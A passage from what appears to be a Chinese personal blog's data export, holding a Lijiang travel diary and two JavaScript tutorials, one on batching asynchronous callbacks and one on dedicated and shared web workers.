\n\n![丽江古城](/assets/blogImg/lijiang.jpg)   \n\n回来时给每个身边的好朋友都带了小礼物，最后却发现忘了给自己带。只有旅行时写的一些日记。蠢哭。\n\n##无可救药\n\n丽江这个地方，只要稍微给它写点文字，就会无一例外显得矫情。\n\n天这么蓝，你不能不望。他们说，你看这天真他妈蓝。\n吉他太动人，你不能不听。他们说，靠 ，大爷你NB。\n酒喝得畅快，你不能不喝。他们笑着说，看你爽成那傻X样。\n\n后来我终于明白：用粗俗的话去回避情感。因为这个地方，真是太TMD容易矫情了。\n矫情是病，得治。荒诞又真实的人们认为，粗话是最温柔的良方！\n\n只有在这说上几句，才觉得真实。这种感觉非常的微妙，就好像蜜糖太甜了，你必须去掺点无味的白水。又好比你与班上喜欢的一个姑娘相遇相视，她朝你微笑，你的眼神却飘忽云外。心如鹿撞，表现却一定得毫不在意。哥的心就是一块磐石，脸皮不重要，原则也不重要，重要的就是这不为所动的气场！老天才懂得解释这种诡异的现象。\n\n结果白云悠悠，蓝天依旧。蜜糖还是甜。我们还是一群神经病。\n\n<!--more-->\n\n##总有人幸福\n\n其实可以想象。一个小镇，依山傍水，不经战火，在几百年上千年的时间里，太阳的万丈光华挥洒其中，自然而然就会像酒一样越来越醇。\n来丽江之前，很多朋友就跟我说，你可能要失望的，这酒，包装太商业化了。第一天在丽江，第一个印象是民谣吉他缓缓流过商业化的四方街，其实没有惊喜，也没有失望。一切刚刚好。\n\n后来我们每个晚上都跑古城，就越来越轻车熟路。小路直奔大水车，沿着满街的《一瞬间》走到四方街，左边吃的，右边酒吧。我喜欢这么简单的路线，连我这路痴都无所畏惧。但后来我又想，让我在这迷路一次也行呀。\n\n有一天晚上，跟小草，jeep，karl一起去love wine & 9酒吧。这里一男一女的驻唱，吉他与纳西手鼓相映相和，节拍流淌似水。“风花雪月”一瓶接着一瓶入喉，我觉得自己像一条鱼。酒是个好东西，所有的向往所有的忧虑所有的惆怅所有的欢乐，都可以借此浸泡在沉思里。往事的大浪滔滔，倒流的是一些水，你又会觉得跟鱼无关。这个时候，各自陈旧的心锁一一被瓦解，听着别人的故事感觉是自己的独白。每个人自有自的欢乐与悲伤，酒和音乐是大功率的放大器，将内心的电波投射到夜里，管它有没有听众。\n\n而后我说，但夜里不该只聊孤独，迷茫与悔恨，此时此刻还是有幸福的东西呀。你们看那两个驻唱，他们是一对。能一起唱歌多幸福！\n他们说，你怎么看出是一对？\n我说，他们自己说的，你们没听见。\n他们说，即使是一对，也不见得幸福，只是你看起来他们幸福。\n\n直到他们唱到《安阳》——\n> 所有的人都醉了             \n  请为我点盏灯火          \n  在夜里静静歌唱         \n  回忆是淡淡忧伤…         \n\n妈蛋我最喜欢听的这首歌，此刻才最有感觉。\n以前我觉得那个“点盏灯火”的人，应该是个还醒着的人，或许是个温柔的女孩，来找醉了的“我”；现在突然觉得，既然所有人都醉了，点灯的人应该就是自己。但他并不孤独，因为，所有的人都陪他醉了。\n\n你们的眼睛都瞎了？两人唱完最后一首粤语歌，下楼梯还拉着手。我不相信他们不幸福。未来和过去不必讲，至少此时此刻。\n\n##把我埋葬在深深的凉粉里\n\n比起古城，我更喜欢束河。\n白天人少，许多店铺十点多还没开门。有天一早，就跟小草去束河。两人写完明信片，走出“时光漫步”，往右一看，好家伙，没有一个人，一条路居然可望到尽头，蓝天与青石相接，两旁建筑静谧慵懒，好像所有的生灵都躲着我们不敢出来。小草说，没有人的古镇才有味道。我心里也被震撼住了，我说，是呀，但我的确闻到了好香的味道。\n\n鸡豆凉粉。\n\n胖乎乎的凉粉块好似肥肉，老婆子拿小铁皮切开，这就蹦跳着下锅啦。起油锅，洋洋洒洒铺一层油，凉粉们说，不对，脚底有点疼，老子不干了，生气了，就在上面滑溜溜的跳啊闹啊。青绿色慢慢变黄，翻一下，不敢用力，太嫩了怕翻烂。凉粉们还唱起了歌，滋滋滋的瞎叫。老婆子一看凉粉们在求饶，怪可怜的，就让他们跳到铲子上来。这边姜蒜辣椒切得了，扔上一把，趁着凉粉的热气，一凑合，一搅拌，齐活了。\n\n开始惴惴不安，其一，这世界上原来还有热的凉粉？其二，这世界还有块状的凉粉？不过管它呢，都到我碗里来。\n咬一口，辣椒让凉粉的味道活了，鲜香饱满，温润通畅。\n其三，世界上原来还有这么好吃的凉粉呀…\n\n##去哪儿\n\n好比，一个女子，老了就应该优雅智慧，从容端庄，这是她最真实的美丽。假如她还假装纯真烂漫，恐怕是令人啼笑的。\n一座古城也应该这样。无线电波包围你我，Wifi和3G横穿马路，难不成在古城通讯还得飞鸽传书？这不真实。丽江很真实，至少从某种意义来说。这样的地方，才不容易玩腻。\n\n如果真的玩腻了，那就离开丽江。\n上雪山在阳光里运动运动。\n要么去拉市海骑马，看看日出。\n要么去泸沽湖，白天风景，晚上火塘。\n再去香格里拉，到松赞林寺看下喇嘛。\n或者到普达措转一圈，看看湖里的白云。\n晚上约上几个朋友，再到独克宗找个地方喝酒。聊聊天，随便做点什么。\n\n几天下来，你就会发现，还是丽江有意思。\n\n\n\n\nTHE END.\n2014.9.26","slug":"journey-to-yunnan","updated":1412683143000,"excerpt":"<p><img src=\"/assets/blogImg/lijiang.jpg\" alt=\"丽江古城\">   </p>\n<p>回来时给每个身边的好朋友都带了小礼物，最后却发现忘了给自己带。只有旅行时写的一些日记。蠢哭。</p>\n<h2 id=\"无可救药\">无可救药</h2>\n<p>丽江这个地方，只要稍微给它写点文字，就会无一例外显得矫情。</p>\n<p>天这么蓝，你不能不望。他们说，你看这天真他妈蓝。<br>吉他太动人，你不能不听。他们说，靠 ，大爷你NB。<br>酒喝得畅快，你不能不喝。他们笑着说，看你爽成那傻X样。</p>\n<p>后来我终于明白：用粗俗的话去回避情感。因为这个地方，真是太TMD容易矫情了。<br>矫情是病，得治。荒诞又真实的人们认为，粗话是最温柔的良方！</p>\n<p>只有在这说上几句，才觉得真实。这种感觉非常的微妙，就好像蜜糖太甜了，你必须去掺点无味的白水。又好比你与班上喜欢的一个姑娘相遇相视，她朝你微笑，你的眼神却飘忽云外。心如鹿撞，表现却一定得毫不在意。哥的心就是一块磐石，脸皮不重要，原则也不重要，重要的就是这不为所动的气场！老天才懂得解释这种诡异的现象。</p>\n<p>结果白云悠悠，蓝天依旧。蜜糖还是甜。我们还是一群神经病。</p>\n","_id":"ejgxoz23sykcpa2g","categories":[],"photos":[],"link":""},{"layout":"post","title":"统一处理异步的js回调","date":1381028100000,"comments":true,"tags":["ejm72ndmomwgbvme","w6w1sbbrofyval78"],"content":"<p>js编程时经常会用到异步处理，而异步会带了所谓的并发问题。比如，你需要向服务器发出多个ajax请求，然后在返回所有结果后做进一步处理，同时要显示动画。因此我们需要用到以下的方案。<br><a id=\"more\"></a></p>\n<h3 id=\"【定义函数】\"><strong>【定义函数】</strong></h3>\n<p>定义Batch函数。参数为函数组成的数组functions，这里面的函数将稍后执行，以及这些函数完成后的回调completionHandler。          </p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Batch</span><span class=\"params\">(functions, completionHandler)</span> </span>{</div><div class=\"line\">　　<span class=\"keyword\">this</span>._functions = functions;</div><div class=\"line\">　　<span class=\"keyword\">this</span>._completionHandler = completionHandler;</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<h3 id=\"【启动请求】\"><strong>【启动请求】</strong></h3>\n<p>用this._remaining来记录未执行的函数量，然后执行各个函数。    </p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">Batch.prototype.execute = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">execute</span><span class=\"params\">()</span> </span>{</div><div class=\"line\">　　<span class=\"keyword\">var</span> i;</div><div class=\"line\">  \t<span class=\"keyword\">var</span> functions = <span class=\"keyword\">this</span>._functions;</div><div class=\"line\">  \t<span class=\"keyword\">var</span> length = <span class=\"keyword\">this</span>._remaining = functions.length;</div><div class=\"line\">  \t<span class=\"keyword\">this</span>._results = [];</div><div class=\"line\">  \t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; length; i += <span class=\"number\">1</span>) {</div><div class=\"line\">      \tfunctions[i](<span class=\"keyword\">this</span>);</div><div class=\"line\">  \t}</div><div class=\"line\">};</div></pre></td></tr></table></figure>\n\n<h3 id=\"【让Batch知道函数完成】\"><strong>【让Batch知道函数完成】</strong></h3>\n<p>用this._results来记录执行结果，当this._remaining为0时，表示所有函数已执行完毕。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">Batch.prototype.done = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">done</span><span class=\"params\">(result)</span> </span>{</div><div class=\"line\">　　<span class=\"keyword\">this</span>._remaining -= <span class=\"number\">1</span>;</div><div class=\"line\">　　<span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span>(result) !== <span class=\"string\">'undefined'</span>) {</div><div class=\"line\">    \t<span class=\"keyword\">this</span>._results.push(result);</div><div class=\"line\">  \t}</div><div class=\"line\">  \t<span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>._remaining === <span class=\"number\">0</span>) {</div><div class=\"line\">      \t<span class=\"keyword\">this</span>._completionHandler(<span class=\"keyword\">this</span>._results);</div><div class=\"line\">  \t}</div><div class=\"line\">};</div></pre></td></tr></table></figure>\n\n<p>到这里，就完成了Batch这个函数的简单功能了。</p>\n<h3 id=\"【使用】\"><strong>【使用】</strong></h3>\n<p>将Batch应用到实际上。      </p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> urls = [</div><div class=\"line\">  \t<span class=\"string\">'/api/gists/1000'</span>,</div><div class=\"line\">  \t<span class=\"string\">'/api/gists/1001'</span>,</div><div class=\"line\">  \t<span class=\"string\">'/api/gists/1002'</span>,</div><div class=\"line\">  \t<span class=\"string\">'/api/gists/1003'</span>,</div><div class=\"line\">  \t<span class=\"string\">'/api/gists/1004'</span>,</div><div class=\"line\">  \t<span class=\"comment\">// ...</span></div><div class=\"line\">  \t<span class=\"string\">'/api/gists/1337'</span>,</div><div class=\"line\">  \t<span class=\"comment\">// etc...</span></div><div class=\"line\">];</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">var</span> i;</div><div class=\"line\"><span class=\"keyword\">var</span> length = urls.length;</div><div class=\"line\"><span class=\"keyword\">var</span> batchFunctions = [];</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// 创建需要被batch执行的函数数组</span></div><div class=\"line\"><span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; length; i += <span class=\"number\">1</span>) {</div><div class=\"line\">  \tbatchFunctions.push(<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">(batch)</span> </span>{</div><div class=\"line\">      \t$.ajax.get(urls[i], <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">(response)</span> </span>{</div><div class=\"line\">          \tbatch.done(response);</div><div class=\"line\">      \t});</div><div class=\"line\">  });</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">var</span> myBatch = <span class=\"keyword\">new</span> Batch(batchFunctions, <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">(results)</span> </span>{</div><div class=\"line\">　　<span class=\"comment\">//返回各个函数的结果数组</span></div><div class=\"line\">});</div><div class=\"line\"></div><div class=\"line\">myBatch.execute(); <span class=\"comment\">// 开始执行</span></div></pre></td></tr></table></figure>\n\n<p>这样的方案其实是参考了“观察者”模式。相关源码推荐nodeJs的Async.js库。</p>\n<p>THE END.</p>\n","source":"_posts/handling-asynchronous-js.markdown","raw":"---\nlayout: post\ntitle: \"统一处理异步的js回调\"\ndate: 2013-10-06 10:55\ncomments: true\ntags: \n\t- web \n\t- js\n---       \njs编程时经常会用到异步处理，而异步会带了所谓的并发问题。比如，你需要向服务器发出多个ajax请求，然后在返回所有结果后做进一步处理，同时要显示动画。因此我们需要用到以下的方案。\n<!-- more -->\n###**【定义函数】**\n定义Batch函数。参数为函数组成的数组functions，这里面的函数将稍后执行，以及这些函数完成后的回调completionHandler。          \n```js\n\tfunction Batch(functions, completionHandler) {\n\t\tthis._functions = functions;\n\t\tthis._completionHandler = completionHandler;\n\t}\n```\n###**【启动请求】**\n用this._remaining来记录未执行的函数量，然后执行各个函数。    \n```js  \n\tBatch.prototype.execute = function execute() {\n\t\tvar i;\n\t  \tvar functions = this._functions;\n\t  \tvar length = this._remaining = functions.length;\n\t  \tthis._results = [];\n\t  \tfor (i = 0; i < length; i += 1) {\n\t      \tfunctions[i](this);\n\t  \t}\n\t};\n```\n###**【让Batch知道函数完成】**\n用this._results来记录执行结果，当this._remaining为0时，表示所有函数已执行完毕。\n```js            \n\tBatch.prototype.done = function done(result) {\n\t\tthis._remaining -= 1;\n\t\tif (typeof(result) !== 'undefined') {\n\t    \tthis._results.push(result);\n\t  \t}\n\t  \tif (this._remaining === 0) {\n\t      \tthis._completionHandler(this._results);\n\t  \t}\n\t};\n```\n到这里，就完成了Batch这个函数的简单功能了。\n\n###**【使用】**\n将Batch应用到实际上。      \n```js\n\tvar urls = [\n\t  \t'/api/gists/1000',\n\t  \t'/api/gists/1001',\n\t  \t'/api/gists/1002',\n\t  \t'/api/gists/1003',\n\t  \t'/api/gists/1004',\n\t  \t// ...\n\t  \t'/api/gists/1337',\n\t  \t// etc...\n\t];\n\n\tvar i;\n\tvar length = urls.length;\n\tvar batchFunctions = [];\n\n\t// 创建需要被batch执行的函数数组\n\tfor (i = 0; i < length; i += 1) {\n\t  \tbatchFunctions.push(function (batch) {\n\t      \t$.ajax.get(urls[i], function (response) {\n\t          \tbatch.done(response);\n\t      \t});\n\t  });\n\t}\n\n\tvar myBatch = new Batch(batchFunctions, function (results) {\n\t\t//返回各个函数的结果数组\n\t});\n\n\tmyBatch.execute(); // 开始执行\n```\n这样的方案其实是参考了“观察者”模式。相关源码推荐nodeJs的Async.js库。\n\nTHE END.","slug":"handling-asynchronous-js","updated":1409365026000,"excerpt":"<p>js编程时经常会用到异步处理，而异步会带了所谓的并发问题。比如，你需要向服务器发出多个ajax请求，然后在返回所有结果后做进一步处理，同时要显示动画。因此我们需要用到以下的方案。<br>","_id":"30vdh3d76vimsz0i","categories":[],"photos":[],"link":""},{"layout":"post","title":"web worker简易入门","date":1380077700000,"comments":true,"tags":["ejm72ndmomwgbvme","panvos05q85sf6qq"],"content":"<p>js是单线程的语言，由于此特性，我们在处理并发时需要用到一些技巧，如setTimeout()，setInterval()，调用XMLHttpRequest等。<br>但这里的并发只是非阻塞（参照John Resig的文章<a href=\"http://ejohn.org/blog/how-javascript-timers-work/\" target=\"_blank\" rel=\"external\">How JavaScript Timers Work</a>），真正的多线程编程则需要HTML5的web worker。<br><a id=\"more\"></a></p>\n<h3 id=\"【worker的使用】\"><strong>【worker的使用】</strong></h3>\n<p>web worker的使用非常简单，线程之间通讯的api与html5 postmessage或node.js里面的socket.io方法类似。</p>\n<p>通讯：      </p>\n<ol>\n<li>发送方：postMessage(data)      </li>\n<li>接收方：onmessage(event)</li>\n</ol>\n<p>终止web worker:        </p>\n<ol>\n<li>子线程: self.close()</li>\n<li>父线程: worker.terminate()</li>\n</ol>\n<p>按照目前w3c规范，web worker分为两种：专用worker(Dedicated Worker)和共享worker(Shared Worker)。<br><a id=\"more\"></a></p>\n<h3 id=\"【专用worker】\"><strong>【专用worker】</strong></h3>\n<p>实例化一个web worker对象，异步加载子线程文件worker.js，其中的代码将执行。</p>\n<pre><code><span class=\"keyword\">var</span> worker = <span class=\"keyword\">new</span> Worker(<span class=\"string\">\"worker.js\"</span>);\n</code></pre><p>给worker增加侦听</p>\n<pre><code>worker.onmessage = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">(<span class=\"keyword\">event</span>)</span> <span class=\"comment\">{\n    alert(event.data);\n}</span>;</span>\n</code></pre><p>在worker.js里，发送消息给父线程     </p>\n<pre><code>postMessage(<span class=\"string\">'hello，imweb'</span>);\n</code></pre><p>在父线程页面就能看到发送过来的信息了。</p>\n<p>同时，在web worker标准中，是支持对象参数的，也就是说我们能够传递json数据。再看一个稍微复杂点的例子，父线程：</p>\n<pre><code><span class=\"keyword\">var</span> worker = <span class=\"keyword\">new</span> Worker(<span class=\"string\">\"worker.js\"</span>);\nworker.onmessage = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">(event)</span> </span>{\n    <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"result\"</span>).innerHTML=event.data;\n};\n\n<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">start</span><span class=\"params\">()</span></span>{\n    worker.postMessage({<span class=\"string\">'cmd'</span>: <span class=\"string\">'start'</span>, <span class=\"string\">'msg'</span>: <span class=\"string\">'start'</span>});\n}\n\n<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pause</span><span class=\"params\">()</span></span>{\n    worker.postMessage({<span class=\"string\">'cmd'</span>: <span class=\"string\">'pause'</span>, <span class=\"string\">'msg'</span>: <span class=\"string\">'pause'</span>});\n}\n\n<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">stop</span><span class=\"params\">()</span></span>{\n    worker.postMessage({<span class=\"string\">'cmd'</span>: <span class=\"string\">'stop'</span>, <span class=\"string\">'msg'</span>: <span class=\"string\">'stop'</span>});\n}\n\n<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">msg</span><span class=\"params\">()</span></span>{\n    worker.postMessage({<span class=\"string\">'msg'</span>: <span class=\"string\">'hello imweb'</span>});\n}\n</code></pre><p>worker.js：</p>\n<pre><code><span class=\"keyword\">self</span>.onmessage = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">(e)</span> </span>{\n    <span class=\"keyword\">var</span> data = e.data;\n      <span class=\"keyword\">switch</span> (data.cmd) {\n    <span class=\"keyword\">case</span> <span class=\"string\">'start'</span>:\n        taskStart(); <span class=\"comment\">//大量数据处理</span>\n          postMessage(<span class=\"string\">'WORKER DO: '</span> + data.msg);\n          <span class=\"keyword\">break</span>;\n    <span class=\"keyword\">case</span> <span class=\"string\">'pause'</span>:\n        taskPause();\n          postMessage(<span class=\"string\">'WORKER DO: '</span> + data.msg);\n          <span class=\"keyword\">break</span>;\n    <span class=\"keyword\">case</span> <span class=\"string\">'stop'</span>:\n          postMessage(<span class=\"string\">'WORKER DO: '</span> + data.msg);\n          <span class=\"keyword\">self</span>.close(); <span class=\"comment\">//终止web worker</span>\n          <span class=\"keyword\">break</span>;\n    <span class=\"keyword\">default</span>:\n          postMessage(<span class=\"string\">'MESSAGE: '</span> + data.msg);\n      };\n};\n</code></pre><p>从上面的例子可以看到，一是利用对象参数，进程之间能够较灵活的实现控制；二是当woker执行taskStart()处理大量数据时，只在子进程处理，不会给主页面带来阻塞，通常，处理大量数据会消极影响程序的响应能力，而web worker通过这样的方式，能提供一个更流畅更实时的UI。</p>\n<h3 id=\"【共享worker】\"><strong>【共享worker】</strong></h3>\n<p>共享worker允许线程在同源中的多个页面间进行共享，例如：同源中所有页面或脚本可以与同一个共享线程通信。它的实例化与事件侦听的写法与专用worker略有不同,主页面：</p>\n<pre><code><span class=\"keyword\">var</span> worker = <span class=\"keyword\">new</span> SharedWorker(<span class=\"string\">'shared-worker.js'</span>);\nworker.port.onmessage = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(e)</span> </span>{\n    msg = <span class=\"string\">'Someone just said \"'</span> + e.data.message + <span class=\"string\">'\". That is message number '</span> + e.data.counter;\n    <span class=\"built_in\">console</span>.log(msg);\n};\nworker.port.postMessage(<span class=\"string\">'hello shared worker!'</span>);\n</code></pre><p>shared-worker.js:        </p>\n<pre><code><span class=\"keyword\">var</span> counter = <span class=\"number\">0</span>;\n<span class=\"keyword\">var</span> connections = [];\nonconnect = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(eConn)</span> </span>{\n       <span class=\"keyword\">var</span> port = eConn.ports[<span class=\"number\">0</span>]; <span class=\"comment\">// 此连接的特有port</span>\n\n   <span class=\"comment\">//当有消息的时候通知所有的连接</span>\n   port.onmessage = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(eMsg)</span> </span>{ \n       counter++;\n       <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>; i &lt; connections.length; i++) {\n           connections[i].postMessage({\n               message: eMsg.data,\n               counter: counter\n           });\n       }\n   }\n   port.start();\n   connections.push(port);\n</code></pre><p>用两个窗口打开这个页面，第一个显示：<strong>Someone just said “Hello shared worker!” This is message number 1</strong>，第二个也收到一样的信息，<br>但是后面是<strong>message number 2</strong>。</p>\n<h3 id=\"【安全性和错误检查】\"><strong>【安全性和错误检查】</strong></h3>\n<p>出于安全性的考虑，web worker必须遵守同源策略。同时，它的全局对象是worker对象本身，this和self引用的都是worker对象。<br>只能访问：</p>\n<ol>\n<li>navigator 对象（仅限appName, appVersion, platform, userAgent）</li>\n<li>location 对象（只读）</li>\n<li>XMLHttpRequest</li>\n<li>setTimeout(), setInterval(), clearTimeout()和clearInterval()方法</li>\n</ol>\n<p>不能访问：</p>\n<ol>\n<li>DOM(不是线程安全的)</li>\n<li>window 对象</li>\n<li>document 对象</li>\n<li>parent 对象</li>\n</ol>\n<p>worker内部出现错误时，可以用worker.onerror侦听到，error的事件有三个属性：      </p>\n<ol>\n<li>filename: 发生错误的文件名</li>\n<li>lineno: 代码行号</li>\n<li>message: 完整的错误信息</li>\n</ol>\n<p>如：</p>\n<pre><code>worker.onerror = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(e)</span> </span>{\n    <span class=\"built_in\">console</span>.log(e.filename+<span class=\"string\">\"ERROR on line\"</span>+e.lineno+<span class=\"string\">\",msg:\"</span>+e.message);\n}\n</code></pre><h3 id=\"【web_worker的其他尝试】\"><strong>【web worker的其他尝试】</strong></h3>\n<p>对于比较消耗时间的操作，我们可看到web worker能够发挥它的作用。比如：大量数据排序，精确到像素的canvas计算等。而我们又知道，jsonp加载数据时，动态创建script标签，加载和执行这些过程都是阻塞式的，而web worker正好可以异步加载，这会是更快的方式吗？带着这个疑问我做了下面的试验，分别用jsonp和worker的方式去加载文件，计算数据返回时延：</p>\n<pre><code><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">tryJsonp</span><span class=\"params\">()</span></span>{\n    <span class=\"keyword\">var</span> d = (<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()).valueOf();\n    <span class=\"keyword\">var</span> jsonp=<span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"script\"</span>);  \n    jsonp.type=<span class=\"string\">\"text/javascript\"</span>;  \n    jsonp.src=<span class=\"string\">\"worker.js?_=\"</span>+d;  \n    <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"head\"</span>)[<span class=\"number\">0</span>].appendChild(jsonp);\n    jsonp.onload = jsonp.onreadystatechange = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>{  \n           <span class=\"keyword\">if</span>(!<span class=\"keyword\">this</span>.readyState||<span class=\"keyword\">this</span>.readyState==<span class=\"string\">'loaded'</span>||<span class=\"keyword\">this</span>.readyState==<span class=\"string\">'complete'</span>){  \n               <span class=\"built_in\">console</span>.log(<span class=\"string\">'jsonp: '</span>+ ((<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()).valueOf() - d));\n        }  \n    }\n}\n<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">tryWorker</span><span class=\"params\">()</span></span>{\n    <span class=\"keyword\">var</span> d = (<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()).valueOf();\n    <span class=\"keyword\">var</span> worker = <span class=\"keyword\">new</span> Worker(<span class=\"string\">\"worker.js\"</span>);\n    worker.postMessage({<span class=\"string\">'cmd'</span>: <span class=\"string\">'start'</span>, <span class=\"string\">'msg'</span>: <span class=\"string\">'start'</span>});\n    worker.onmessage = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">(event)</span> </span>{\n        <span class=\"built_in\">console</span>.log(<span class=\"string\">'web worker: '</span>+ ((<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()).valueOf() - d));\n    };\n}\n</code></pre><p>第一次加载是一份1k大小的文件，每个方法重复5次，返回结果为:<br><img src=\"/assets/blogImg/web_worker1.png\" alt=\"1k文件重复5次\"><br>第二次加载1800k大小的文件，返回结果为：<br><img src=\"/assets/blogImg/web_worker2.png\" alt=\"1800k文件重复5次\"><br>可以看到对于较小的数据，jsonp还是比web worker要快，这可能是实例化worker对象时带来的影响；而数据偏大时，web worker的加载将会更优，而且它可以异步加载。</p>\n<p>THE END.</p>\n","source":"_posts/web-worker-learning.markdown","raw":"---\nlayout: post\ntitle: \"web worker简易入门\"\ndate: 2013-09-25 10:55\ncomments: true\ntags: \n\t- web \n\t- html5\n---       \njs是单线程的语言，由于此特性，我们在处理并发时需要用到一些技巧，如setTimeout()，setInterval()，调用XMLHttpRequest等。\n但这里的并发只是非阻塞（参照John Resig的文章[How JavaScript Timers Work](http://ejohn.org/blog/how-javascript-timers-work/)），真正的多线程编程则需要HTML5的web worker。\n<!-- more -->\n###**【worker的使用】**\nweb worker的使用非常简单，线程之间通讯的api与html5 postmessage或node.js里面的socket.io方法类似。\n\n通讯：      \n\n1. 发送方：postMessage(data)      \n2. 接收方：onmessage(event)\n\n终止web worker:        \n\n1. 子线程: self.close()\n2. 父线程: worker.terminate()\n\n按照目前w3c规范，web worker分为两种：专用worker(Dedicated Worker)和共享worker(Shared Worker)。\n<!--more-->\n###**【专用worker】**\n实例化一个web worker对象，异步加载子线程文件worker.js，其中的代码将执行。\n\n    var worker = new Worker(\"worker.js\");\n\n给worker增加侦听\n\n    worker.onmessage = function (event) {\n        alert(event.data);\n    };\n\n在worker.js里，发送消息给父线程     \n\n\tpostMessage('hello，imweb');\n    \n在父线程页面就能看到发送过来的信息了。\n\n同时，在web worker标准中，是支持对象参数的，也就是说我们能够传递json数据。再看一个稍微复杂点的例子，父线程：\n\n\tvar worker = new Worker(\"worker.js\");\n\tworker.onmessage = function (event) {\n\t\tdocument.getElementById(\"result\").innerHTML=event.data;\n\t};\n\n\tfunction start(){\n\t\tworker.postMessage({'cmd': 'start', 'msg': 'start'});\n\t}\n\n\tfunction pause(){\n\t\tworker.postMessage({'cmd': 'pause', 'msg': 'pause'});\n\t}\n\n\tfunction stop(){\n\t\tworker.postMessage({'cmd': 'stop', 'msg': 'stop'});\n\t}\n\n\tfunction msg(){\n\t\tworker.postMessage({'msg': 'hello imweb'});\n\t}\n\nworker.js：\n\n\tself.onmessage = function (e) {\n\t\tvar data = e.data;\n\t  \tswitch (data.cmd) {\n\t    case 'start':\n\t    \ttaskStart(); //大量数据处理\n\t      \tpostMessage('WORKER DO: ' + data.msg);\n\t      \tbreak;\n\t    case 'pause':\n\t    \ttaskPause();\n\t      \tpostMessage('WORKER DO: ' + data.msg);\n\t      \tbreak;\n\t    case 'stop':\n\t      \tpostMessage('WORKER DO: ' + data.msg);\n\t      \tself.close(); //终止web worker\n\t      \tbreak;\n\t    default:\n\t      \tpostMessage('MESSAGE: ' + data.msg);\n\t  \t};\n\t};\n\n从上面的例子可以看到，一是利用对象参数，进程之间能够较灵活的实现控制；二是当woker执行taskStart()处理大量数据时，只在子进程处理，不会给主页面带来阻塞，通常，处理大量数据会消极影响程序的响应能力，而web worker通过这样的方式，能提供一个更流畅更实时的UI。\n\n###**【共享worker】**\n共享worker允许线程在同源中的多个页面间进行共享，例如：同源中所有页面或脚本可以与同一个共享线程通信。它的实例化与事件侦听的写法与专用worker略有不同,主页面：\n\n\tvar worker = new SharedWorker('shared-worker.js');\n\tworker.port.onmessage = function(e) {\n\t    msg = 'Someone just said \"' + e.data.message + '\". That is message number ' + e.data.counter;\n\t    console.log(msg);\n\t};\n\tworker.port.postMessage('hello shared worker!');\n\nshared-worker.js:        \n\n\tvar counter = 0;\n\tvar connections = [];\n\tonconnect = function(eConn) {\n   \t\tvar port = eConn.ports[0]; // 此连接的特有port\n\n   \t//当有消息的时候通知所有的连接\n   \tport.onmessage = function(eMsg) { \n       \tcounter++;\n       \tfor (var i=0; i < connections.length; i++) {\n           \tconnections[i].postMessage({\n               \tmessage: eMsg.data,\n               \tcounter: 